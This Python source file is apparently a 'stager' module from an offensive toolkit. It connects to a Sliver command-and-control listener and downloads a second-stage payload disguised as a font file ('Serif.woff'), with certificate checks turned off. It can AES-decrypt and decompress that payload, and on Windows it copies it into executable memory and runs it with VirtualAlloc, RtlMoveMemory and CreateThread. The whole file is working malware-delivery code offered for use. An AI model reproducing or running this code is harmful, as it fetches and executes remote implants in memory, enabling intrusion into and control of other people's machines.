########################################################
### Sliver Module
### Status: migrated 085, check if working
###
########################################################

#from utils.helper import nstate as nstate
from utils.style import *
from utils.helper import CheckFile, GetFileHash
from os import name as osname
if osname == 'nt':
    from utils.windef import *
    from utils.winconst import *
from time import sleep
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests

CATEGORY    = 'stager'
DESCRIPTION = 'Connect to a Sliver HTTPS listener, download stage and execute'

arglist = {
     'remote_host':         { 'value': '', 'desc': 'Remote host to connect to e.g. 192.168.2.1' },
     'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
     'save':                { 'value': '', 'desc': 'Save the stage as file: --save filename' },
     'sleeptime':           { 'value': 0, 'desc': 'Sleep for x seconds before the stage is executed' },
     'aes':                 { 'value': ['',''], 'desc': 'AES stage decrypter: --aes <key> <iv> / set aes ["key","iv"]' },
     #'aes_key':             { 'value': '', 'desc': '[Deprecated] Specify the AES key for decryption' },
     #'aes_iv':              { 'value': '', 'desc': '[Deprecated] Specify the AES IV for decryption' },
     'compression':         { 'value': 0, 'desc': 'Decompress the stage after download' },
     'headers':             { 'value': False, 'desc': 'Print stage headers' },
     'use_https':           { 'value': True, 'desc': 'Use either https or http' }
}

def register_arguments(parser):
        parser.add_argument('-p', '--remote-port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
        parser.add_argument('-r', '--remote-host', type=str, required=True, help=arglist['remote_host']['desc'])
        parser.add_argument('-s', '--save', type=str, help=arglist['save']['desc'])
        grp = parser.add_argument_group('additional')
        grp.add_argument('-a', '--aes', nargs=2, required=False, default=['', ''], help='AES decrypt the stage after download: --aes <key> <iv>')
        grp.add_argument('-c', '--compression', default=0, action='store_true', required=False, help=arglist['compression']['desc'])
        grp.add_argument('-st', '--sleeptime', default=0, type=int, required=False, help=arglist['sleeptime']['desc'])
        vrb = parser.add_argument_group('more')
        vrb.add_argument('--headers', default=0, action='store_true', required=False, help=arglist['headers']['desc'])
        vrb.add_argument('--use-https', default=True, action='store_true', help=arglist['use_https']['desc'])
        #grp2 = parser.add_argument_group('Deprecated, will be removed in a future release')
        #grp2.add_argument('-ak', '--aes-key', default='', deprecated=True, type=str, required=False, help=arglist['aes_key']['desc'])
        #grp2.add_argument('-ai', '--aes-iv', default='', deprecated=True, type=str, required=False, help=arglist['aes_iv']['desc'])

class module:
    
    Author = 'psycore8'
    Version = '2.2.2'
    DisplayName = 'SLIVER-STAGER'
    payload_size = 0
    header_16bytes = ''
    relay = False
    shell_path = '::stager::sliver'
    requests.packages.urllib3.disable_warnings() 

    import gzip

    def msg(self, message_type, MsgVar=None, ErrorExit=False):
        messages = {
            'pre.head'      : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'proc.sock'     : f'{s_note} Creating Socket...',
            'proc.con'      : f'{s_ok} Connection established',
            'post.done'     : f'{s_ok} DONE!',
            'mok'            : f'{s_ok} {MsgVar}',
            'mnote'          : f'{s_note} {MsgVar}',
            'merror'         : f'{s_fail} {MsgVar}'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    #def __init__(self, remote_host=str, remote_port=int, save=str, sleeptime=int, aes=['', ''], aes_key=None, aes_iv=None, compression=False, headers=False, use_https=True):
    def __init__(self, remote_host=str, remote_port=int, save=str, sleeptime=int, aes=['', ''], compression=False, headers=False, use_https=True):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.save = save
        self.sleeptime = sleeptime
        self.compression = compression
        self.use_https = use_https
        self.headers = headers
        self.aes = aes
        #self.aes_key = aes_key
        #self.aes_iv = aes_iv

    def aes_decrypt(self, data, aes_key, aes_iv):
        cipher = Cipher(algorithms.AES(aes_key.encode('utf-8')), modes.CBC(aes_iv.encode('utf-8')), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        def unpad(data):
            pad_length = data[-1] 
            return data[:-pad_length]
        decrypted_data = unpad(decrypted_padded)
        return decrypted_data
    
    def decompress(self, data):
        return self.gzip.decompress(data) 
    
    def ph(self, header, size):
         self.header_16bytes = ' '.join(f'{byte:02X}' for byte in header)
         self.payload_size = size
         #self.msg('proc.header')
         self.msg('mnote', f'Printing size and 16 bytes of header:\n{f_out} Size: {self.payload_size}\n{f_out} {self.header_16bytes}')

    def process(self):
        m = self.msg
        if self.aes != ['', ''] or None:
            aes_key = self.aes[0]
            aes_iv = self.aes[1]
            print(f'{aes_key} - {aes_iv}')
        # else:
        #      aes_key = self.aes_key
        #      aes_iv = self.aes_iv
        #print(f'{self.aes_key} - {self.aes_iv}')
        self.msg('pre.head')
        if self.use_https:
            static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
        else:
             static_url = f'http://{self.remote_host}:{self.remote_port}/Serif.woff'
        try:
            #self.msg('proc.stage')
            m('mnote', 'Download stage...')
            response = requests.get(static_url, stream=True, verify=False)
            #self.msg('proc.url')
            m('mnote', f'Stage URL: {static_url}')
            response.raise_for_status()
            stage_data = response.content
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            #self.msg('proc.stage')
            m('mnote', 'Download stage...')
        except requests.exceptions.RequestException as e:
            #self.msg('error.stage_ok')
            m('merror', 'Error during download', True)

        #if aes_key:
        if self.aes != ['', ''] or None:
            #self.msg('proc.decrypt')
            m('mnote', 'decrypting data')
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            stage_data = self.aes_decrypt(stage_data[16:], aes_key, aes_iv)
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
        if self.compression:
            #self.msg('proc.decomp')
            m('mnote', 'decompressing data')
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            stage_data = self.decompress(stage_data)
            if self.headers: self.ph(stage_data[0:16], len(stage_data))

        self.payload_size = len(stage_data)
        #self.msg('proc.stage_ok')
        m('mok', f'Stage downloaded! Size: {self.payload_size} bytes')

        stage_buffer = stage_data
        #self.msg('proc.buf')
        m('mnote', 'Payload found!')

        if self.save != '':
            with open(self.save, 'wb') as f: # type: ignore
                  f.write(stage_buffer)
            m('mok', f'File {self.save} saved')
            self.relay = True


        if not self.relay and os.name == 'nt':
            ptr = VirtualAlloc(0, len(stage_buffer), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
            if ptr:
                #self.msg('inj.alloc')
                m('mnote', 'Memory allocated!')
            else:
                #self.msg('error.alloc', True)
                m('merror', 'Error allocating memory', True)
            RtlMoveMemory(ptr, stage_buffer, len(stage_buffer))
            if self.sleeptime > 0:
                #self.msg('inj.sleep')
                m('mnote', f'Let\'s take a nap for {self.sleeptime} seconds')
                sleep(self.sleeptime)

            ht = CreateThread(None, 0, ptr, None, 0, None)
            if ht:
                    #self.msg('inj.exec')
                    m('mok', 'Thread created, execute the payload')
            else:
                    #self.msg('error.inj')
                    m('merror', 'Thread not created, exiting')
            WaitForSingleObject(ht, -1)
        elif self.relay:
             print('\n')
             return stage_buffer


    